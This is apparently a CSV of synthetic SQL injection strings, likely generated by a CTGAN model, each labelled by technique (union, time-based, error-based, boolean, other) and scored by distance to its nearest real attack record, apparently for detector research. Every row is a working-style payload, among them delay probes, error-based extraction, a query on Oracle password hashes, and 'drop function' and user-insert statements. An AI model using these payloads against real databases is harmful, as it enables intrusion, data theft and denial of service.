CTGAN_000429,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R003691,4.318971529910477
CTGAN_000430,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R002880,16.20672832732528
CTGAN_000431,attack,error,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R000773,3.583338678050801
CTGAN_000432,attack,union,"-3126   )    )    union all select 6718,6718,6718,6718,6718--",nearest_attack_euclidean,R004292,3.4081338767835607
CTGAN_000433,attack,boolean,"1%"" or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R007763,3.680160817344235
CTGAN_000434,attack,boolean,"1%""   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001262,3.4265783923905007
CTGAN_000435,attack,union,"1""   )    )    as yfpl where 4820  =  4820 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R007887,7.119750085048893
CTGAN_000436,attack,error,"-6523"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""bwrb"" like ""bwrb",nearest_attack_euclidean,R001510,3.7986279867156973
CTGAN_000437,attack,error,"1'||  (  select 'qrle' from dual where 9239  =  9239 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R006375,3.309224017816404
CTGAN_000438,attack,boolean,"1%""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R006189,7.618612648969371
CTGAN_000439,attack,boolean,1' in boolean mode  )   and 9198  =  9198--,nearest_attack_euclidean,R007127,2.911565968697026
CTGAN_000440,attack,time,select pg_sleep  (  5  )   and    (    (     (  9476  =  9476,nearest_attack_euclidean,R005888,2.8900712870841456
CTGAN_000441,attack,other,"iif  (  3204  =  8489,3204,1/0  )  ",nearest_attack_euclidean,R000919,4.667496615521543
CTGAN_000442,attack,boolean,1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R007555,3.6782280751799883
CTGAN_000443,attack,time,1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R001552,4.669959212508912
CTGAN_000444,attack,error,"1' in boolean mode  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  #",nearest_attack_euclidean,R007392,4.689630711193032
CTGAN_000445,attack,time,1'+  (  select 'jtvq' where 8288  =  8288 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R001800,4.604994954271178
CTGAN_000446,attack,union,"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",nearest_attack_euclidean,R006563,3.2801054427419998
CTGAN_000447,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ifvz' like 'ifvz,nearest_attack_euclidean,R005105,4.870996947426515
CTGAN_000448,attack,other,1'  )   as pudv where 2609  =  2609,nearest_attack_euclidean,R002866,0.7225846293351644
CTGAN_000449,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R006767,4.4191537254868
CTGAN_000450,attack,other,"iif  (  3204  =  8489,3204,1/0  )  ",nearest_attack_euclidean,R000919,2.7908192382332513
CTGAN_000451,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R001026,4.723757954554078
CTGAN_000452,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  6051  =  6051",nearest_attack_euclidean,R001376,3.539197972321776
CTGAN_000453,attack,other,select name from syscolumns where id   =     (  sele ...,nearest_attack_euclidean,R000440,3.259604891185623
CTGAN_000454,attack,other,1 exec sp_   (  or exec xp_  ) ,nearest_attack_euclidean,R000634,4.7408186299797475
CTGAN_000455,attack,other, (  select   (  case when   (  9263  =  9263  )   then 1 else 9263*  (  select 9263 from mysql.db  )   end   )    ) ,nearest_attack_euclidean,R001248,4.636294790937955
CTGAN_000456,attack,other, (  select 2412  =    (  'qqpjq'||  (  select case 2412 when 2412 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    ) ,nearest_attack_euclidean,R002371,5.269548215642674
CTGAN_000457,attack,boolean,"admin""  )   or ""1""  =  ""1",nearest_attack_euclidean,R000213,7.05405605609603
CTGAN_000458,attack,time,"1,  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R005449,4.9860514076172215
CTGAN_000459,attack,boolean,"1""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""rqxd""  =  ""rqxd",nearest_attack_euclidean,R002033,4.984267341508407
CTGAN_000460,attack,union,"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",nearest_attack_euclidean,R002741,3.492202625636008
CTGAN_000461,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R005163,2.3875813993856863
CTGAN_000462,attack,time,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'mepp'  =  'mepp,nearest_attack_euclidean,R005838,2.945512986044685
CTGAN_000463,attack,other,1   )    )    as syot where 1199  =  1199,nearest_attack_euclidean,R005149,2.4001564820518824
CTGAN_000464,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000410,6.3576816210522615
CTGAN_000465,attack,boolean,"1'+  (  select qmez where 3729  =  3729 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002549,4.242082463885278
CTGAN_000466,attack,error,"  (  extractvalue  (  1759,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1759  =  1759,1   )    )     )  ,0x717a767a71   )    )     )  ",nearest_attack_euclidean,R007717,1.429687758106672
CTGAN_000467,attack,union,-8760  )   where 8277  =  8277 union all select 8277--,nearest_attack_euclidean,R006924,2.0602285779259217
CTGAN_000468,attack,error,1'||  (  select 'hlxd' from dual where 2615  =  2615 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',nearest_attack_euclidean,R004288,5.2912942885429315
CTGAN_000469,attack,time,1'  )   or sleep  (  5  )   and   (  'mdmr' like 'mdmr,nearest_attack_euclidean,R001700,4.752738521240621
CTGAN_000470,attack,boolean,-5861'  )   or 1581  =  2611 and   (  'mvjh' like 'mvjh,nearest_attack_euclidean,R005036,1.490757569799985
CTGAN_000471,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kudh' like 'kudh",nearest_attack_euclidean,R006790,2.2730334937847494
CTGAN_000472,attack,time,1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,nearest_attack_euclidean,R001176,4.14243546887571
CTGAN_000473,attack,other,"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  ",nearest_attack_euclidean,R000468,12.213599954781987
CTGAN_000474,attack,union,"-5026' where 7324  =  7324 union all select 7324,7324--",nearest_attack_euclidean,R001499,2.9916150983835674
CTGAN_000475,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R006453,2.721672957098371
CTGAN_000476,attack,error,"1'||  (  select 'jpow' from dual where 4381  =  4381 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",nearest_attack_euclidean,R002664,3.3546597168977983
CTGAN_000477,attack,time,"1'  )   where 6731  =  6731 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R003719,4.885037841327058
CTGAN_000478,attack,time,"1"" or sleep  (  5  )  ",nearest_attack_euclidean,R004430,3.2078172389271544
CTGAN_000479,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000192,6.088867956347535
CTGAN_000480,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R007468,2.653284309533634
CTGAN_000481,attack,boolean,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  4666  =  4666",nearest_attack_euclidean,R002005,2.2414809985982993
CTGAN_000482,attack,boolean,"1'||  (  select 'fmss' from dual where 7025  =  7025 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R006600,3.8929105080658006
CTGAN_000483,attack,other,1'  )   as fkpn where 1100  =  1100,nearest_attack_euclidean,R007606,0.823996378766701
CTGAN_000484,attack,other,""" or """" """,nearest_attack_euclidean,R000286,6.540390333419967
CTGAN_000485,attack,error,"1'||  (  select 'mwmn' where 5112  =  5112 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",nearest_attack_euclidean,R001472,4.674877542524448
CTGAN_000486,attack,time,1'   )    )    as yqcl where 5026  =  5026 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R002009,4.43130863232075
CTGAN_000487,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  PASSWORD   )    )    FROM SYS.USER$   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000613,6.867311664754888
CTGAN_000488,attack,other,"1,  (  case when 8260  =  8260 then 1 else null end  )  ",nearest_attack_euclidean,R002784,3.244354168705961
CTGAN_000489,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R007573,4.258854104626355
CTGAN_000490,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R008444,4.173446448036083
CTGAN_000491,attack,union,"-2046'  )   union all select 6668,6668--",nearest_attack_euclidean,R005613,5.717619622991051
CTGAN_000492,attack,boolean,"1' in boolean mode  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #",nearest_attack_euclidean,R008120,5.132090085740602
CTGAN_000493,attack,time,1   )    )    as sipp where 1999  =  1999 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,nearest_attack_euclidean,R001813,4.774153464970044
CTGAN_000494,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu",nearest_attack_euclidean,R000867,1.8804989906601453
CTGAN_000495,attack,union,"-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--",nearest_attack_euclidean,R006276,3.273041764348016
CTGAN_000496,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001840,3.299998231948978
CTGAN_000497,attack,other,1 exec sp_   (  or exec xp_  ) ,nearest_attack_euclidean,R000634,4.6074702188700245
CTGAN_000498,attack,union,"-7122""  )   union all select 4002,4002,4002,4002,4002,4002,4002,4002#",nearest_attack_euclidean,R001930,3.9085686022344555
CTGAN_000499,attack,union,"1  )   as wokl where 1368  =  1368 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R005110,3.027797977162066
CTGAN_000500,attack,other,"1""   )    )    as puws where 7006  =  7006",nearest_attack_euclidean,R002045,3.5068296611663468
CTGAN_000501,attack,union,"1%""  )   union all select null,null,null,null--",nearest_attack_euclidean,R002266,4.4619526797626285
CTGAN_000502,attack,error,-4906'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'pkrq'  =  'pkrq,nearest_attack_euclidean,R007562,3.0981922562896314
CTGAN_000503,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",nearest_attack_euclidean,R004331,3.0398858198273944
CTGAN_000504,attack,other,if  (  5896  =  4251  )   select 5896 else drop function xmyk--,nearest_attack_euclidean,R001289,3.201271155217619
CTGAN_000505,attack,union,"1%'  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R006240,3.238059882652996
CTGAN_000506,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R007956,3.7846571388948824
CTGAN_000507,attack,other,""" or """" """,nearest_attack_euclidean,R000286,8.630543537869038
CTGAN_000508,attack,boolean,"1   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  9255  =  9255",nearest_attack_euclidean,R001716,4.5189711132030785
CTGAN_000509,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R007430,5.275019593520175
CTGAN_000510,attack,union,1'   )    )    union all select null--,nearest_attack_euclidean,R005403,7.817375676495101
CTGAN_000511,attack,other,"  (  select 1 from generate_series  (  8515,8515,case when   (  8515  =  3477  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R004787,4.884802715924988
CTGAN_000512,attack,boolean,"-4407""  )   where 2055  =  2055 or elt  (  9714  =  5040,5040  )  --",nearest_attack_euclidean,R008385,4.628132824539041
CTGAN_000513,attack,boolean,"1%""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R006189,4.243634701019993
CTGAN_000514,attack,boolean,end and    (    (     (  'gqhc'  =  'gqhc,nearest_attack_euclidean,R007351,3.605004014136708
CTGAN_000515,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R003399,6.088759729381715
CTGAN_000516,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R007153,4.64958377803038
CTGAN_000517,attack,boolean,"admin"" or 1  =  1",nearest_attack_euclidean,R000141,2.814193113547201
CTGAN_000518,attack,error,"-3194""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""erua""  =  ""erua",nearest_attack_euclidean,R004295,3.14920618907792
CTGAN_000519,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,9.281425489365589
CTGAN_000520,attack,other,""" or """" """,nearest_attack_euclidean,R000286,6.588433351286998
CTGAN_000521,attack,time,1'   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R001775,2.1737283622250536
CTGAN_000522,attack,time,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'wvzb'  =  'wvzb,nearest_attack_euclidean,R008789,4.7572823545782885
CTGAN_000523,attack,union,"-4248""   )    )    union all select 9450,9450,9450--",nearest_attack_euclidean,R005708,3.3479189988458025
CTGAN_000524,attack,other,"1',  (  select   (  case when   (  5249  =  9648  )   then 1 else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R005472,4.231524842795127
CTGAN_000525,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R002880,3.0681437462242895
CTGAN_000526,attack,union,"-6597'+  (  select aewz where 4036  =  4036 union all select 4036,4036,4036,4036,4036,4036,4036--",nearest_attack_euclidean,R001318,6.437604098114854
CTGAN_000527,attack,error,"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130",nearest_attack_euclidean,R006838,2.297672350714583
CTGAN_000528,attack,boolean,"1' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R007852,3.261746352012907
CTGAN_000529,attack,union,"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",nearest_attack_euclidean,R002114,3.4057781337544326
CTGAN_000530,attack,boolean,"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'bxnn'  =  'bxnn",nearest_attack_euclidean,R007766,3.7379901087645004
CTGAN_000531,attack,boolean,"-3436  )   or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R008702,2.4506330384964046
CTGAN_000532,attack,other,select   (  case when   (  1082  =  6755  )   then 1082 else 1082*  (  select 1082 from mysql.db  )   end  )  #,nearest_attack_euclidean,R008660,4.077050978032954
CTGAN_000533,attack,boolean,"1 and elt  (  8853  =  1675,1675  )  -- jegm",nearest_attack_euclidean,R004931,2.525483060298544
CTGAN_000534,attack,error,"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""pnub""  =  ""pnub",nearest_attack_euclidean,R003856,4.039707317002648
CTGAN_000535,attack,boolean,"1' where 9003  =  9003 and make_set  (  5868  =  8316,8316  )  --",nearest_attack_euclidean,R002632,3.136108042346039
CTGAN_000536,attack,other,"1""  )   as vqkz where 8536  =  8536",nearest_attack_euclidean,R004832,8.226295193597242
CTGAN_000537,attack,boolean,"1%'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R008055,2.8280826381756485
CTGAN_000538,attack,boolean,"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and ""cbck"" like ""cbck",nearest_attack_euclidean,R008184,3.434137612216506
CTGAN_000539,attack,other,1' where 7036  =  7036,nearest_attack_euclidean,R001285,3.8872064418648256
CTGAN_000540,attack,boolean,"1%""  )   and 9764  =  6037 and   (  ""%""  =  """,nearest_attack_euclidean,R007481,2.041313716358877
CTGAN_000541,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R002638,2.73661664006533
CTGAN_000542,attack,boolean,"1""  )   and make_set  (  4553  =  8132,8132  )   and   (  ""pfci"" like ""pfci",nearest_attack_euclidean,R008399,2.7471456111672863
CTGAN_000543,attack,time,1'   )    )     )   and sleep  (  5  )  #,nearest_attack_euclidean,R001973,3.7136585641935245
CTGAN_000544,attack,error,"1'||  (  select 'mwmn' where 5112  =  5112 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",nearest_attack_euclidean,R001472,2.447932815295876
CTGAN_000545,attack,other,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3# kuqm",nearest_attack_euclidean,R008250,3.7346792055135953
CTGAN_000546,attack,boolean,"1'+  (  select qmez where 3729  =  3729 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002549,2.996661384867669
CTGAN_000547,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,8.969750981065223
CTGAN_000548,attack,boolean,"1'+  (  select lgkd where 7801  =  7801 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R006801,2.0233062364344248
CTGAN_000549,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'lywy' like 'lywy",nearest_attack_euclidean,R008427,5.75132754513282
CTGAN_000550,attack,time,"1""   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R008380,3.379985840656977
CTGAN_000551,attack,error,"1""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""auyv""  =  ""auyv",nearest_attack_euclidean,R003259,4.069610771533352
CTGAN_000552,attack,other,"1',  (  select   (  case when   (  5249  =  9648  )   then 1 else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R005472,3.7650010589692657
CTGAN_000553,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R003039,2.6416067058854917
CTGAN_000554,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R004443,4.896050536544612
CTGAN_000555,attack,other,"1""   )    )    as chal where 6661  =  6661",nearest_attack_euclidean,R002111,3.624431963324041
CTGAN_000556,attack,other,-4947' order by 1#,nearest_attack_euclidean,R004062,5.997816705730428
CTGAN_000557,attack,time,"1'  )   as vlwh where 9403  =  9403 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R004364,6.6563181764900365
CTGAN_000558,attack,time,"1"" where 1683  =  1683 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R005177,4.0644392578162325
CTGAN_000559,attack,union,"-2333' union all select 9714,9714,9714--",nearest_attack_euclidean,R003807,5.828628258928966
CTGAN_000560,attack,other,select   (  case when   (  9746  =  8055  )   then 9746 else 1/  (  select 0  )   end  )  --,nearest_attack_euclidean,R004600,2.7776536391836895
CTGAN_000561,attack,union,"1'  )   where 8628  =  8628 union all select null,null,null--",nearest_attack_euclidean,R007511,2.663012496171238
CTGAN_000562,attack,union,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",nearest_attack_euclidean,R007992,11.034311061943036
CTGAN_000563,attack,other,"  (  select 1 from generate_series  (  8515,8515,case when   (  8515  =  3477  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R004787,4.511438322894277
CTGAN_000564,attack,other,select case when 7426  =  6635 then 1 else null end--,nearest_attack_euclidean,R000917,3.446311580270227
CTGAN_000565,attack,other,1   )    )    as mlpf where 7425  =  7425,nearest_attack_euclidean,R001024,3.819858884641656
CTGAN_000566,attack,boolean,1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- slje,nearest_attack_euclidean,R005627,3.2467245845319317
CTGAN_000567,attack,time,1'+  (  select 'diet' where 7004  =  7004 rlike sleep  (  5   )    )   +',nearest_attack_euclidean,R005804,3.4114161326841415
CTGAN_000568,attack,union,"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",nearest_attack_euclidean,R001609,2.1649665199330594
CTGAN_000569,attack,union,"1  )   where 8630  =  8630 union all select null,null--",nearest_attack_euclidean,R002805,3.871108980237236
CTGAN_000570,attack,union,"-4093'   )    )    union all select 5785,5785,5785#",nearest_attack_euclidean,R007115,3.820948142927871
CTGAN_000571,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""ftjg""  =  ""ftjg",nearest_attack_euclidean,R001282,4.460766857487184
CTGAN_000572,attack,boolean,"1'||  (  select 'fmss' from dual where 7025  =  7025 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R006600,4.312020597405852
CTGAN_000573,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kudh' like 'kudh",nearest_attack_euclidean,R006790,5.1792094733592196
CTGAN_000574,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R003005,3.208874218765288
CTGAN_000575,attack,union,"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",nearest_attack_euclidean,R006910,3.915044929521776
CTGAN_000576,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,14.961070302453761
CTGAN_000577,attack,error,"  (  select 2768 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  2768  =  2768,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R003669,2.8334503786454763
CTGAN_000578,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,4.043027126330951
CTGAN_000579,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R001194,4.362683076032671
CTGAN_000580,attack,union,"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",nearest_attack_euclidean,R008296,5.486145618301567
CTGAN_000581,attack,error,"1%' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and '%'  =  '",nearest_attack_euclidean,R006797,4.736101801052771
